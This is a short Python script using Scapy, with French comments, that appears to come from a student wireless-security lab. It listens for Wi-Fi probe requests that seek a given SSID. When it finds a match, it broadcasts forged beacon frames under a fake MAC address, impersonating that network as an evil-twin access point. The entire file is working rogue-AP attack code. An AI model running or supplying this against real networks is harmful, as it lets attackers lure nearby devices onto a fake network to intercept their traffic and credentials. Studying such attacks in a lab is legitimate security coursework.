# Auteurs    : Dylan Canton & Christian Zaccaria
# Date       : 30.03.2022
# Descriptif : Script permettant de detecter une STA cherchant un SSID défini et de proposer un evil Twin
# Entrée     : script4_evilTwin.py -i <INTERFACE> -s <SSID>
# Source     : http://www.nicola-spanti.info/fr/documents/tutorials/computing/programming/python/scapy/search-ssid-with-probe-request.html
#            : https://github.com/adamziaja/python/blob/master/probe_request_sniffer.py
#            : https://www.thepythoncode.com/article/create-fake-access-points-scapy

from scapy.all import *
import argparse
from faker import Faker

BROADCAST = "ff:ff:ff:ff:ff:ff"

# Param nécessaire (à remplir) permettant de lancer le scan
parser = argparse.ArgumentParser(prog="Scapy SSID finder", description="SSID scan in prob request")
parser.add_argument("-i", "--Interface", required=True, help="Interface to scan")
parser.add_argument("-s", "--SSID", required=True, help="Resarched SSID")
tab_args = parser.parse_args()

ssid_founded = False

# Cherche un SSID correspondant
def find_ssid(pkt):
    if pkt.haslayer(Dot11Elt):
        #Check si c'est une probe request
        if pkt.type == 0 and pkt.subtype == 4:
            if pkt.info.decode() == tab_args.SSID:
                print("\nSSID trouvé")
                ssid_founded = True
                evil_twin_attack()


# Propose de lancer une attaque evil twin si un SSID correspondant est trouvé
def evil_twin_attack():
    #Creation fausse MAC addresse
    mac = Faker().mac_address()
    #Forge le paquet (mac addresse fausse + ssid)
    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=mac, addr3=mac)
    ssid = Dot11Elt(ID="SSID", info=tab_args.SSID, len=len(tab_args.SSID))
    frame = RadioTap()/dot11/Dot11Beacon()/ssid

    print("Les paquets vont être envoyés et l'AP simulé CTRL+C pour annuler...")
    sendp(frame, iface=tab_args.Interface, loop=1)

# On sniff le réseau sur l'interface choisie
sniff(iface=tab_args.Interface, prn=find_ssid, timeout=30)
if ssid_founded == False:
    print("Aucun SSID n'a été trouvé")
